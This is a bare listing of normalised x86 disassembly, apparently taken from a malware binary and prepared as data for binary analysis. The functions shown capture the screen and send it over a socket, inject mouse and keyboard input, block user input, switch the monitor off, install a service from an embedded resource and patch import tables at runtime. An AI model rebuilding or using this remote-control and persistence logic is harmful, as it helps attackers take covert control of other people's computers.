mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi eax
call sub_1001265d
lea eax [ ebp - 0x8 ]
push eax
mov eax [ esi + 0xa4 ]
call sub_10009e61
mov [ ebp - 0xc ] eax
call sub_1001265d
mov ebx [ ebp - 0x8 ]
test ebx ebx
je r-xdata
pop esi
pop ebx
leave
retn
test eax eax
je r-xdata
lea eax [ ebx + 0x5 ]
push edi
push eax
mov [ ebp - 0x4 ] eax
call sub_1000ac5e
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
push 0x4
lea eax [ ebp - 0x4 ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov [ edi ] 0x75
call sub_1000ac80
push ebx
push [ ebp - 0xc ]
lea eax [ edi + 0x5 ]
push eax
call sub_1000ac80
mov eax [ ebp - 0x4 ]
add esp 0x18
push edi
call sub_10009870
push edi
call sub_1000d1a0
pop ecx
sub_10009870
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
mov ebx eax
lea eax [ ebp - 0x8 ]
push eax
push 0x8004667e
push [ esi + 0x4 ]
xor edi edi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x8 ] edi
call [ ioctlsocket@IAT ]
test ebx ebx
jle r-xdata
call [ GetLastError@IAT ]
push eax
call sub_1001265d
add esp 0x4
mov [ esi + 0x8 ] 0x0
xor al al
jmp r-xdata
mov ebx [ send@IAT ]
pop edi
pop ebx
leave
retn 0x4
push [ ebp - 0x4 ]
push eax
jmp r-xdata
test edi edi
jg r-xdata
sub [ ebp - 0x4 ] eax
add edi eax
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov eax [ ebp + 0x8 ]
add eax edi
push eax
push [ esi + 0x4 ]
call ebx
test eax eax
jle r-xdata
mov al 0x1
mov eax 0x1000
cmp [ ebp - 0x4 ] eax
push 0x0
jle r-xdata
sub_100098ec
push 0xc
mov eax sub_10020e5b
call sub_1001ce3f
mov edi [ ebp + 0x8 ]
mov eax edi
call sub_100096eb
push 0xffffffff
push [ edi + 0xc ]
call [ WaitForSingleObject@IAT ]
push 0x96
call [ Sleep@IAT ]
lea eax [ ebp + 0x8 ]
xor ebx ebx
push eax
mov [ ebp + 0x8 ] ebx
call [ GetCurrentProcessId@IAT ]
push eax
call [ ProcessIdToSessionId@IAT ]
push [ ebp + 0x8 ]
call sub_1001265d
add esp 0x4
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
push 0x8
push [ ebp + 0x8 ]
mov [ ebp - 0x18 ] ebx
push ebx
mov [ ebp - 0x14 ] ebx
call WTSQuerySessionInformationW
test eax eax
je r-xdata
mov eax edi
call sub_10009769
mov [ ebp - 0x4 ] ebx
cmp [ ebp - 0x14 ] 0x4
jne r-xdata
xor eax eax
call sub_1001ce75
retn 0x4
mov eax edi
call sub_100097f4
jmp r-xdata
mov eax [ ebp - 0x18 ]
mov esi [ eax ]
push eax
call WTSFreeMemory
call sub_1001265d
cmp esi ebx
jne r-xdata
cmp [ edi + 0x8 ] bl
je r-xdata
sub_10009998
push ebx
mov ebx [ SendMessageW@IAT ]
push ebp
mov ebp [ SystemParametersInfoW@IAT ]
push esi
mov esi [ esp + 0x10 ]
push edi
push 0xa
call [ Sleep@IAT ]
dec [ esp + 0x14 ]
jne r-xdata
mov edi [ esi + 0x14 ]
call sub_1000961f
mov eax esi
call sub_10009b95
test al al
je r-xdata
cmp [ esi + 0xa ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x1
push 0x56
call ebp
push 0x2
push 0xf170
push 0x112
push 0xffff
call ebx
mov [ rw-data ] 0x1
jmp r-xdata
movzx eax [ esi + 0x9 ]
push eax
call [ BlockInput@IAT ]
mov eax esi
call sub_10009b95
test al al
je r-xdata
xor eax eax
push eax
push eax
push eax
push 0x56
call ebp
push 0xffffffff
push 0xf170
push 0x112
push 0xffff
call ebx
mov [ rw-data ] 0x0
mov [ esp + 0x14 ] 0x64
mov edi [ esi + 0x14 ]
call sub_1000961f
jmp r-xdata
sub_10009a54
push ecx
push ecx
push ebx
push ebp
push esi
push edi
call sub_10007f3c
mov eax [ esp + 0x20 ]
push 0x1c
xor edx edx
pop ecx
div ecx
xor edi edi
cmp eax edi
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn 0x8
mov esi [ esp + 0x1c ]
mov ebx [ mouse_event@IAT ]
add esi 0x8
mov [ esp + 0x20 ] eax
mov eax [ esi - 0x4 ]
mov ecx 0x203
cmp eax ecx
ja r-xdata
movzx eax [ esi + 0x6 ]
movzx ebp [ esi + 0x4 ]
push eax
push ebp
mov [ esp + 0x1c ] eax
call [ SetCursorPos@IAT ]
push [ esp + 0x14 ]
push ebp
call [ WindowFromPoint@IAT ]
push eax
call [ SetCapture@IAT ]
sub eax 0x204
je r-xdata
je r-xdata
push edi
push edi
push edi
push edi
push 0x8
dec eax
je r-xdata
push edi
push edi
push edi
push edi
push 0x6
call ebx
push edi
push edi
push edi
push edi
push 0x6
jmp r-xdata
sub eax 0x100
je r-xdata
mov eax [ esi - 0x4 ]
add eax 0xfffffe00
cmp eax 0x8
ja r-xdata
push edi
push edi
push edi
push edi
push 0x10
jmp r-xdata
dec eax
je r-xdata
call ebx
push edi
push edi
dec eax
je r-xdata
push edi
push edi
push edi
push edi
push 0x18
call ebx
push edi
push edi
push edi
push edi
push 0x18
jmp r-xdata
dec eax
je r-xdata
add esi 0x1c
dec [ esp + 0x20 ]
jne r-xdata
push edi
push 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
push edi
push edi
push edi
push edi
push 0x20
jmp r-xdata
dec eax
je r-xdata
push edi
push [ esi ]
call [ MapVirtualKeyW@IAT ]
push eax
movzx eax [ esi ]
push eax
call [ keybd_event@IAT ]
jmp r-xdata
dec eax
je r-xdata
push edi
push edi
push edi
push edi
push 0x40
jmp r-xdata
dec eax
dec eax
jne r-xdata
sub eax 0xfc
je r-xdata
movsx eax [ esi + 0x2 ]
push edi
push eax
push edi
push edi
push 0x800
jmp r-xdata
push edi
push edi
push edi
push edi
push 0x2
jmp r-xdata
dec eax
jne r-xdata
push edi
push edi
push edi
push edi
push 0x4
jmp r-xdata
sub_10009b95
mov eax [ eax + 0xa4 ]
push esi
mov esi [ eax + 0x68 ]
push edi
mov edi [ GetSystemMetrics@IAT ]
push 0x0
call edi
cmp [ esi + 0x4 ] eax
jne r-xdata
xor eax eax
inc eax
push 0x1
call edi
cmp [ esi + 0x8 ] eax
jne r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
retn
sub_10009bc2
push ebp
mov ebp esp
sub esp 0x14
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x14 ] 0x14
call [ GetCursorInfo@IAT ]
test eax eax
je r-xdata
or eax 0xffffffff
cmp [ ebp - 0x10 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0xc ]
push esi
xor esi esi
add eax 0x44
push ecx
call [ DestroyCursor@IAT ]
cmp esi 0x10
jne r-xdata
inc esi
add eax 0x4
cmp esi 0x10
jl r-xdata
mov eax esi
or eax 0xffffffff
jmp r-xdata
cmp ecx [ eax ]
je r-xdata
leave
retn 0x4
pop esi
jmp r-xdata
sub_10009c19
push 0x0
mov eax sub_10020e1a
call sub_1001ce0c
mov edi ecx
mov esi [ ebp + 0x8 ]
lea ebx [ esi + 0x88 ]
mov [ esi ] r--data
call sub_10009151
xor ebx ebx
mov eax edi
dec eax
mov [ ebp - 0x4 ] ebx
je r-xdata
mov [ esi + 0x70 ] edi
sub eax 0x3
je r-xdata
sub eax 0x4
je r-xdata
push 0x8
pop ecx
sub eax ecx
je r-xdata
sub eax 0x10
je r-xdata
mov [ esi + 0x70 ] ecx
jmp r-xdata
call [ GetDesktopWindow@IAT ]
push eax
mov [ esi + 0x10c ] eax
call [ GetDC@IAT ]
mov [ esi + 0x44 ] eax
mov [ esi + 0x10 ] 0xcc0020
mov [ esi + 0x4 ] 0x1
call [ GetTickCount@IAT ]
mov edi [ GetSystemMetrics@IAT ]
mov [ esi + 0x14 ] eax
mov al [ ebp + 0xc ]
push ebx
mov [ esi + 0x8 ] 0x64
mov [ esi + 0x18 ] 0xa
mov [ esi + 0xc ] al
call edi
push 0x1
mov [ esi + 0x28 ] eax
call edi
mov [ esi + 0x2c ] eax
push 0x20
pop eax
cdq
idiv [ esi + 0x70 ]
push [ esi + 0x44 ]
mov edi [ CreateCompatibleDC@IAT ]
mov [ esi + 0x30 ] ebx
mov [ esi + 0x24 ] al
call edi
push [ esi + 0x44 ]
mov [ esi + 0x4c ] eax
call edi
push ebx
mov [ esi + 0x80 ] eax
call edi
push ebx
mov [ esi + 0x48 ] eax
call edi
push 0x1
push [ esi + 0x28 ]
lea edi [ esi + 0x5c ]
push [ esi + 0x70 ]
mov [ esi + 0x50 ] eax
push esi
mov [ edi ] ebx
mov [ esi + 0x60 ] ebx
call sub_1000a090
push [ esi + 0x2c ]
mov [ esi + 0x64 ] eax
push [ esi + 0x28 ]
push [ esi + 0x70 ]
push esi
call sub_1000a090
push 0x1
push [ esi + 0x28 ]
mov [ esi + 0x68 ] eax
push [ esi + 0x70 ]
push esi
call sub_1000a090
push ebx
push ebx
push edi
mov edi [ CreateDIBSection@IAT ]
push ebx
push [ esi + 0x64 ]
mov [ esi + 0x6c ] eax
push [ esi + 0x44 ]
call edi
push ebx
push ebx
mov [ esi + 0x54 ] eax
lea eax [ esi + 0x60 ]
push eax
push ebx
push [ esi + 0x68 ]
push [ esi + 0x44 ]
call edi
push ebx
mov [ esi + 0x58 ] eax
push ebx
lea eax [ esi + 0x78 ]
push eax
push ebx
push [ esi + 0x68 ]
push [ esi + 0x44 ]
call edi
push [ esi + 0x58 ]
mov edi [ SelectObject@IAT ]
push [ esi + 0x4c ]
mov [ esi + 0x84 ] eax
call edi
push [ esi + 0x54 ]
push [ esi + 0x48 ]
call edi
push [ esi + 0x84 ]
push [ esi + 0x80 ]
call edi
push [ esi + 0x2c ]
lea eax [ esi + 0x34 ]
push [ esi + 0x28 ]
push ebx
push ebx
push eax
call [ SetRect@IAT ]
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x14 ]
add eax eax
push eax
call sub_1000ac5e
mov [ esi + 0x1c ] eax
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x14 ]
xor edx edx
div [ esi + 0x2c ]
pop ecx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x74 ] eax
mov eax esi
call sub_1001ce75
retn 0x8
sub_10009ddd
push esi
mov esi ecx
push edi
push [ esi + 0x44 ]
mov [ esi ] r--data
push [ esi + 0x10c ]
call [ ReleaseDC@IAT ]
push [ esi + 0x48 ]
mov edi [ DeleteDC@IAT ]
call edi
push [ esi + 0x4c ]
call edi
push [ esi + 0x50 ]
call edi
push [ esi + 0x80 ]
call edi
push [ esi + 0x54 ]
mov edi [ DeleteObject@IAT ]
call edi
push [ esi + 0x58 ]
call edi
push [ esi + 0x84 ]
call edi
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
push [ esi + 0x68 ]
call sub_1000d1a0
push [ esi + 0x64 ]
call sub_1000d1a0
push [ esi + 0x6c ]
call sub_1000d1a0
add esp 0xc
pop edi
lea ecx [ esi + 0x88 ]
pop esi
jmp sub_100091f5
push eax
call sub_1000d1a0
pop ecx
sub_10009e61
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
xor ebx ebx
push edi
mov esi eax
cmp [ ebp + 0x8 ] ebx
je r-xdata
xor eax eax
cmp [ esi + 0x1c ] ebx
je r-xdata
call sub_10007f3c
test al al
je r-xdata
mov [ esi + 0x20 ] ebx
lea ebx [ esi + 0x4 ]
xor edi edi
push ebx
inc edi
call sub_1000a180
lea eax [ ebp - 0xc ]
push eax
call [ GetCursorPos@IAT ]
lea eax [ ebp - 0xc ]
push eax
push 0x8
pop edi
call sub_1000a180
lea eax [ esi + 0x88 ]
push eax
call sub_10009bc2
mov [ ebp - 0x1 ] al
lea eax [ ebp - 0x1 ]
xor edi edi
push eax
inc edi
call sub_1000a180
cmp [ ebx ] 0x2
jne r-xdata
push [ esi + 0x44 ]
lea edi [ esi + 0x10c ]
push [ edi ]
call [ ReleaseDC@IAT ]
call [ GetDesktopWindow@IAT ]
push eax
mov [ edi ] eax
call [ GetDC@IAT ]
mov [ esi + 0x44 ] eax
mov eax [ ebp - 0x8 ]
lea edi [ eax - 0x13 ]
test edi edi
jge r-xdata
mov eax [ esi + 0x68 ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x44 ]
push [ esi + 0x80 ]
push esi
call sub_1000a283
mov eax [ esi + 0x68 ]
push [ eax + 0x14 ]
mov eax [ esi + 0x1c ]
add eax [ esi + 0x20 ]
mov edx [ esi + 0x60 ]
mov ecx [ esi + 0x78 ]
push eax
call sub_1000a2ce
add eax [ esi + 0x20 ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp eax [ rw-data ]
je r-xdata
xor edi edi
pop edi
pop esi
pop ebx
leave
retn 0x4
mov edi [ esi + 0x30 ]
jmp r-xdata
mov eax edi
call sub_10009fbe
test al al
jne r-xdata
cmp edi [ esi + 0x2c ]
jl r-xdata
add edi 0x13
mov eax edi
call sub_10009fbe
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
mov eax [ esi + 0x30 ]
add eax 0x3
cdq
push 0x13
pop ecx
idiv ecx
mov eax [ esi + 0x20 ]
mov ecx [ ebp + 0x8 ]
mov edi [ GetTickCount@IAT ]
mov [ ecx ] eax
lea ebx [ esi + 0x14 ]
mov [ esi + 0x30 ] edx
jmp r-xdata
add edi 0x13
call edi
sub eax [ ebx ]
cmp eax [ esi + 0x18 ]
jb r-xdata
push 0x1
call [ Sleep@IAT ]
call edi
push eax
push ebx
call [ InterlockedExchange@IAT ]
jmp r-xdata
mov eax [ esi + 0x1c ]
jmp r-xdata
sub_10009fbe
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push edi
push [ esi + 0x10 ]
mov ebx eax
push ebx
xor eax eax
push eax
push [ esi + 0x44 ]
mov [ ebp - 0x1 ] 0x0
push 0x1
push [ esi + 0x28 ]
push eax
push eax
push [ esi + 0x48 ]
call [ BitBlt@IAT ]
mov edi [ esi + 0x2c ]
mov eax [ esi + 0x5c ]
sub edi ebx
dec edi
imul edi [ esi + 0x74 ]
add edi [ esi + 0x60 ]
lea ecx [ ebx + 0x26 ]
push ecx
push 0xffffffff
add ebx 0xffffffed
push ebx
mov [ ebp - 0x8 ] eax
lea eax [ esi + 0x34 ]
push 0xffffffff
push eax
call [ SetRect@IAT ]
mov edx [ esi + 0x28 ]
xor eax eax
test edx edx
jle r-xdata
mov edi [ esi + 0x3c ]
cmp edi 0xffffffff
jle r-xdata
mov ecx [ edi ]
mov ebx [ ebp - 0x8 ]
cmp ecx [ ebx ]
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop ebx
leave
retn
lea eax [ esi + 0x34 ]
mov ecx [ eax ]
test ecx ecx
jg r-xdata
movzx ecx [ esi + 0x24 ]
add [ ebp - 0x8 ] 0x4
add eax ecx
add edi 0x4
cmp eax edx
jl r-xdata
cmp [ esi + 0x3c ] 0x0
jge r-xdata
mov [ eax ] ecx
mov ecx [ esi + 0x38 ]
test ecx ecx
jg r-xdata
xor ecx ecx
lea ecx [ eax + 0x18 ]
mov [ esi + 0x3c ] ecx
lea ecx [ eax - 0x18 ]
mov [ esi + 0x34 ] ecx
cmp edi edx
mov [ esi + 0x38 ] ecx
mov ecx edi
jl r-xdata
xor ecx ecx
mov edx [ esi + 0x2c ]
mov [ esi + 0x3c ] ecx
mov ecx [ esi + 0x40 ]
cmp ecx edx
jl r-xdata
mov ecx edx
mov [ esi + 0x40 ] ecx
mov ecx esi
call sub_1000a19a
mov [ ebp - 0x1 ] 0x1
mov ecx edx
sub_1000a090
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
xor ebx ebx
xor edi edi
cmp ecx 0x8
jg r-xdata
lea eax [ edi * 4 + 0x28 ]
push eax
call sub_1000ac5e
mov esi eax
mov eax [ ebp + 0x10 ]
mov [ esi + 0x4 ] eax
xor eax eax
inc eax
mov [ esi + 0xc ] ax
mov eax [ ebp + 0xc ]
movzx edx ax
imul edx [ ebp + 0x10 ]
add edx 0x1f
sar edx 0x3
pop ecx
mov ecx [ ebp + 0x14 ]
and edx 0xfffffffc
imul edx ecx
cmp eax 0x10
mov [ esi ] 0x28
mov [ esi + 0x8 ] ecx
mov [ esi + 0xe ] ax
mov [ esi + 0x10 ] ebx
mov [ esi + 0x18 ] ebx
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x14 ] edx
jge r-xdata
inc edi
shl edi cl
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x10
push ebx
call [ GetDC@IAT ]
push 0x1
push 0x1
push eax
mov [ ebp + 0xc ] eax
call [ CreateCompatibleBitmap@IAT ]
push ebx
push esi
push ebx
push ebx
push ebx
push eax
push [ ebp + 0xc ]
mov [ ebp + 0x10 ] eax
call [ GetDIBits@IAT ]
push [ ebp + 0xc ]
push ebx
call [ ReleaseDC@IAT ]
push [ ebp + 0x10 ]
call [ DeleteObject@IAT ]
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] bl
je r-xdata
cmp edi ebx
jle r-xdata
lea ecx [ esi + 0x29 ]
movzx eax [ ecx - 0x1 ]
movzx edx [ ecx ]
imul eax eax 0x75
imul edx edx 0x259
add eax edx
movzx edx [ ecx + 0x1 ]
imul edx edx 0x132
add eax edx
sar eax 0xa
mov [ ecx - 0x1 ] al
mov [ ecx ] al
mov [ ecx + 0x1 ] al
add ecx 0x4
dec edi
jne r-xdata
sub_1000a19a
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
sub ebx [ edi ]
mov esi ecx
mov edx [ esi + 0x6c ]
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov [ edx + 0x4 ] ebx
mov edx [ esi + 0x6c ]
mov [ edx + 0x8 ] eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x6c ]
movzx edx [ eax + 0xe ]
imul edx [ eax + 0x4 ]
add edx 0x1f
sar edx 0x3
and edx 0xfffffffc
imul edx [ eax + 0x8 ]
push ecx
mov [ eax + 0x14 ] edx
push ecx
lea eax [ ebp - 0x8 ]
push eax
push ecx
push [ esi + 0x6c ]
push [ esi + 0x44 ]
call [ CreateDIBSection@IAT ]
push eax
push [ esi + 0x50 ]
mov [ ebp - 0xc ] eax
call [ SelectObject@IAT ]
push [ esi + 0x10 ]
mov eax [ edi + 0x4 ]
mov ecx [ edi ]
push eax
push ecx
push [ esi + 0x44 ]
push [ ebp - 0x4 ]
push ebx
push eax
push ecx
push [ esi + 0x4c ]
call [ BitBlt@IAT ]
push 0xcc0020
push [ edi + 0x4 ]
push [ edi ]
push [ esi + 0x4c ]
push [ ebp - 0x4 ]
push ebx
push 0x0
push 0x0
push [ esi + 0x50 ]
call [ BitBlt@IAT ]
push edi
push 0x10
pop edi
call sub_1000a180
mov eax [ esi + 0x6c ]
push [ ebp - 0x8 ]
mov edi [ eax + 0x14 ]
call sub_1000a180
push [ ebp - 0xc ]
call [ DeleteObject@IAT ]
pop edi
pop esi
pop ebx
leave
retn
sub_1000a283
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ ebp + 0x18 ] esi
jle r-xdata
pop esi
pop ebp
retn 0x14
push edi
mov eax [ ebp + 0x8 ]
push [ eax + 0x10 ]
push esi
push 0x0
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x14 ]
push esi
push 0x0
push [ ebp + 0xc ]
call [ BitBlt@IAT ]
push 0x5
call [ Sleep@IAT ]
add esi edi
cmp esi [ ebp + 0x18 ]
jl r-xdata
mov edi eax
mov eax [ ebp + 0x18 ]
push 0x32
sub eax esi
pop edi
cmp eax edi
ja r-xdata
pop edi
sub_1000a2ce
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push edi
xor edi edi
mov [ ebp - 0xc ] eax
cmp [ ebp + 0xc ] eax
jbe r-xdata
pop edi
leave
retn 0x8
push ebx
push esi
push 0x4
pop esi
add edi esi
add edx esi
add ecx esi
cmp edi [ ebp + 0xc ]
jb r-xdata
mov ebx [ ebp + 0x8 ]
mov [ eax + ebx ] edi
mov ebx [ ecx ]
mov [ edx ] ebx
mov ebx [ ebp + 0x8 ]
lea eax [ eax + ebx + 0x8 ]
mov ebx [ ecx ]
add edi esi
mov [ eax ] ebx
mov ebx esi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x4 ] edi
jmp r-xdata
mov ebx [ edx ]
cmp ebx [ ecx ]
je r-xdata
pop esi
pop ebx
add edx esi
add ecx esi
cmp edi [ ebp + 0xc ]
jb r-xdata
mov edi [ ecx ]
cmp [ edx ] edi
je r-xdata
mov eax [ ebp - 0xc ]
mov edi [ ebp + 0x8 ]
mov [ eax + edi + 0x4 ] ebx
mov edi [ ebp - 0x8 ]
lea eax [ ebx + eax + 0x8 ]
mov [ ebp - 0xc ] eax
add [ ebp - 0x4 ] esi
mov [ edx ] edi
mov edi [ ecx ]
mov [ eax + ebx ] edi
mov edi [ ebp - 0x4 ]
add ebx esi
add [ ebp - 0x8 ] esi
sub_1000a354
push ebp
lea ebp [ esp - 0x194 ]
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x190 ] eax
push ebx
push esi
push edi
mov edi rw-data
call sub_10007215
test al al
jne r-xdata
call sub_1001265d
call sub_1001265d
jmp r-xdata
push r--data
push 0x66
push eax
call [ FindResourceW@IAT ]
mov ebx eax
cmp ebx esi
jne r-xdata
call sub_1001265d
mov eax [ rw-data ]
xor esi esi
cmp eax esi
jne r-xdata
push ebx
push [ rw-data ]
call [ LoadResource@IAT ]
mov edi eax
cmp edi esi
je r-xdata
call sub_1001265d
push ebx
push [ rw-data ]
call [ SizeofResource@IAT ]
push edi
mov ebx eax
call [ LockResource@IAT ]
mov edi eax
cmp edi esi
je r-xdata
mov ecx [ ebp + 0x190 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1000ac69
add ebp 0x194
leave
retn
push esi
push esi
push 0x2
push esi
push esi
push 0x1f01ff
push rw-data
call [ CreateFileW@IAT ]
mov [ ebp - 0x7c ] eax
cmp eax 0xffffffff
jne r-xdata
cmp ebx esi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0xb7
je r-xdata
push esi
lea eax [ ebp - 0x80 ]
push eax
push 0x1
push edi
push [ ebp - 0x7c ]
dec ebx
call [ WriteFile@IAT ]
inc edi
push [ ebp - 0x7c ]
call [ CloseHandle@IAT ]
xor eax eax
push 0x206
mov [ ebp - 0x78 ] ax
lea eax [ ebp - 0x76 ]
push esi
push eax
call sub_1000b660
push r--data
push rw-data
lea eax [ ebp - 0x78 ]
push r--data
push eax
call sub_1000b90f
lea eax [ ebp - 0x78 ]
push rw-data
push eax
call sub_10008338
add esp 0x24
xor eax eax
inc eax
cmp eax 0x20
je r-xdata
push eax
push rw-data
call sub_1001265d
add esp 0x8
jmp r-xdata
xor eax eax
jmp r-xdata
sub_1000a4a4
push ecx
push esi
push edi
push r--data
push rw-data
push r--data
mov esi rw-data
push esi
call sub_1000b90f
add esp 0x10
call sub_1001265d
call sub_1000a354
test eax eax
jne r-xdata
push ebx
push ebp
push 0x2
xor ebx ebx
push ebx
push ebx
xor edi edi
call [ OpenSCManagerW@IAT ]
mov [ esp + 0x10 ] eax
cmp eax ebx
je r-xdata
call sub_1001265d
call sub_1001265d
push ebx
push ebx
push ebx
push ebx
push ebx
push esi
push 0x1
push 0x3
push 0x1
mov ebp 0xf01ff
push ebp
mov esi r--data
push esi
push esi
push eax
call [ CreateServiceW@IAT ]
mov edi eax
cmp edi ebx
jne r-xdata
call sub_1001265d
mov esi [ CloseServiceHandle@IAT ]
push edi
call esi
push [ esp + 0x8 ]
call esi
xor eax eax
cmp eax 0xffffffff
je r-xdata
push ebx
push ebx
push edi
call [ StartServiceW@IAT ]
test eax eax
jne r-xdata
call sub_1001265d
push ebp
push esi
push [ esp + 0x18 ]
call [ OpenServiceW@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
xor eax eax
inc eax
jmp r-xdata
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0xc0000000
push r--data
call [ CreateFileW@IAT ]
pop ebp
cmp eax ebx
pop ebx
je r-xdata
pop edi
pop esi
pop ecx
retn
sub_1000a57e
push ebp
lea ebp [ esp - 0x794 ]
sub esp 0x814
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x790 ] eax
mov eax [ ebp + 0x79c ]
push esi
xor esi esi
push esi
push esi
push 0x3
push esi
push esi
push 0xc0000000
push r--data
mov [ ebp - 0x78 ] eax
call [ CreateFileW@IAT ]
mov [ ebp - 0x74 ] eax
cmp eax esi
je r-xdata
call sub_1001265d
xor eax eax
cmp eax 0xffffffff
je r-xdata
push ebx
push edi
push r--data
mov edi r--data
mov ebx 0x800
push edi
mov esi ebx
call sub_1000b6e5
pop ecx
pop ecx
test eax eax
jne r-xdata
push r--data
push edi
call sub_1000b6e5
pop ecx
pop ecx
test eax eax
jne r-xdata
mov esi 0xffa
push r--data
push edi
call sub_1000b6e5
pop ecx
pop ecx
test eax eax
jne r-xdata
mov esi 0xffb
push r--data
push edi
call sub_1000b6e5
pop ecx
pop ecx
test eax eax
jne r-xdata
mov esi 0xffc
push r--data
push edi
call sub_1000b6e5
pop ecx
pop ecx
test eax eax
jne r-xdata
mov esi 0xffd
push edi
push edi
call sub_1000b6e5
pop ecx
pop ecx
test eax eax
jne r-xdata
mov esi 0xff6
push r--data
push edi
call sub_1000b6e5
pop ecx
pop ecx
mov ecx 0xff9
test eax eax
jne r-xdata
mov esi 0xff8
cmp esi 0xff8
je r-xdata
mov esi ecx
push [ ebp - 0x78 ]
call sub_1000b382
movzx eax ax
pop ecx
push 0x0
mov [ ebp - 0x80 ] eax
lea eax [ ebp - 0x7c ]
push eax
push ebx
lea eax [ ebp - 0x70 ]
push eax
push 0x2
lea eax [ ebp - 0x80 ]
push eax
cmp esi ecx
je r-xdata
mov ecx [ ebp + 0x790 ]
xor ecx ebp
pop esi
call sub_1000ac69
add ebp 0x794
leave
retn
push 0x0
lea eax [ ebp - 0x7c ]
push eax
push ebx
lea eax [ ebp - 0x70 ]
push eax
push [ ebp - 0x78 ]
call sub_1000b3ed
pop ecx
lea eax [ eax + eax + 0x2 ]
push eax
push [ ebp - 0x78 ]
jmp r-xdata
or esi 0x8b000
shl esi 0x2
push esi
push [ ebp - 0x74 ]
call [ DeviceIoControl@IAT ]
push [ ebp - 0x74 ]
call [ CloseHandle@IAT ]
xor eax eax
pop edi
inc eax
pop ebx
jmp r-xdata
sub_1000a6ff
push 0x1c
push r--data
call sub_10011ecc
mov edi ecx
xor esi esi
mov [ ebp - 0x4 ] esi
mov eax [ edi + 0x3c ]
add eax edi
mov ecx [ eax + 0xe0 ]
lea ebx [ ecx + edi ]
mov [ ebp - 0x2c ] ebx
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011f11
retn
cmp [ eax + 0xe4 ] esi
je r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov eax [ ebx + 0x4 ]
cmp eax esi
je r-xdata
cmp [ ebx + 0xc ] esi
je r-xdata
cmp [ ebx + 0x10 ] esi
je r-xdata
push r--data
add eax edi
push eax
call sub_1001a1f7
pop ecx
pop ecx
test eax eax
jne r-xdata
add ebx 0x20
mov [ ebp - 0x2c ] ebx
jmp r-xdata
mov eax [ ebx + 0x10 ]
add eax edi
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x20 ] esi
xor esi esi
add eax edi
add eax 0x2
push eax
push [ rw-data ]
call [ GetProcAddress@IAT ]
mov [ ebp - 0x24 ] eax
add esi edi
add esi [ ebx + 0xc ]
and [ ebp - 0x1c ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x4
push 0x4
push esi
call [ VirtualProtect@IAT ]
mov eax [ ebp - 0x24 ]
mov [ esi ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x1c ]
push 0x4
push esi
call [ VirtualProtect@IAT ]
inc [ ebp - 0x20 ]
mov eax [ ebp - 0x28 ]
jmp r-xdata
mov esi [ ebp - 0x20 ]
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
sub_1000a7f3
push 0x20
push r--data
call sub_10011ecc
xor edi edi
mov [ ebp - 0x4 ] edi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x3c ]
add eax esi
mov ecx [ eax + 0x80 ]
lea ebx [ ecx + esi ]
mov [ ebp - 0x30 ] ebx
mov eax [ eax + 0x84 ]
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10011f11
retn 0x4
cmp eax edi
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax edi
je r-xdata
cmp [ ebx + 0x10 ] edi
je r-xdata
push r--data
add eax esi
push eax
call sub_1001a1f7
pop ecx
pop ecx
test eax eax
jne r-xdata
add ebx 0x14
mov [ ebp - 0x30 ] ebx
jmp r-xdata
mov eax [ ebx ]
cmp eax edi
jne r-xdata
add eax esi
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x1c ] edi
mov edi [ VirtualProtect@IAT ]
mov eax [ ebx + 0x10 ]
js r-xdata
and eax 0x7fffffff
push eax
push [ rw-data ]
